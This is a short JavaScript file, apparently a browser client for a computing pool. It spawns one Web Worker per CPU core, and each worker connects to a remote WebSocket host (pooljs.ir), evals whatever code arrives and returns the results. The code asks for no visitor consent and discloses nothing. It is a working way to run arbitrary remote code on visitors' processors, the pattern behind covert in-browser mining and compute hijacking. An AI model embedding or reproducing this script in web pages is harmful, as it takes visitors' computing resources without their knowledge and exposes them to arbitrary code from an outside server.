(function (context){

	if(window && "WebSocket" in window && typeof(Worker) !== "undefined") {
		function createWorker(foo){
			var str = foo.toString().match(/^\s*function\s*\(\s*\)\s*\{(([\s\S](?!\}$))*[\s\S])/)[1];
			return new Worker(window.URL.createObjectURL(new Blob([str],{type:'text/javascript'})));
		}

		var workerPool = [];
		for(var i = 0; i < navigator.hardwareConcurrency; i++){
			var worker = createWorker(function(){
				var WEBSOCKET_HOST = "pooljs.ir";
				var WEBSOCKET_PORT = 12121;
				var WEBSOCKET_ADDRESS = "wss://" + WEBSOCKET_HOST + ":" + WEBSOCKET_PORT;
				var self = this;
				function startSocket(){
					var sock = new WebSocket(WEBSOCKET_ADDRESS);

					sock.onopen = function(){
					};
					sock.onmessage = function(event){
						var job = JSON.parse(event.data);
						var src = "var fn = " + job.code;
						eval(src);
						var job_result = {"id":job.id,"result":fn.apply(this,job.args)};
						sock.send(JSON.stringify(job_result));
					};
					sock.onclose = function(){
						setTimeout(startSocket,5000);
					};
				}
				startSocket();
			});
			workerPool.push(worker);
		}
		context.worker = {}

		
	}
}(this));
